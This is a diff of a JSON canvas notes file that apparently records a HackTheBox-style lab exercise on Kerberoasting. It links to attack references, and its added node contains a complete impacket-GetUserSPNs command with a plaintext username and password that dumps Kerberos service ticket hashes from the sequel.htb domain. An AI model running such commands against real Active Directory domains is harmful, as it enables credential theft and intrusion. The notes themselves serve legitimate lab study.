@@ -2,7 +2,8 @@
 	"nodes":[
 		{"id":"79cf0dad885bb18b","type":"text","text":"https://www.thehacker.recipes/ad/movement/kerberos/kerberoast","x":-388,"y":-209,"width":548,"height":60},
 		{"id":"c556b23bb5b8452e","type":"text","text":"https://tools.thehacker.recipes/impacket/examples/getuserspns.py","x":-388,"y":-80,"width":548,"height":60},
-		{"id":"7c8c0edd4121a30d","x":-652,"y":-277,"width":250,"height":60,"type":"text","text":"getspnuser impacket found hashes"}
+		{"id":"7c8c0edd4121a30d","type":"text","text":"getspnuser impacket found hashes","x":-652,"y":-277,"width":250,"height":60},
+		{"id":"140c0fe60af8483f","x":-724,"y":100,"width":644,"height":60,"type":"text","text":"impacket-GetUserSPNs -outputfile kerberos.txt sequel.htb/rose:KxEPkKe6R8su"}
 	],
 	"edges":[]
 }
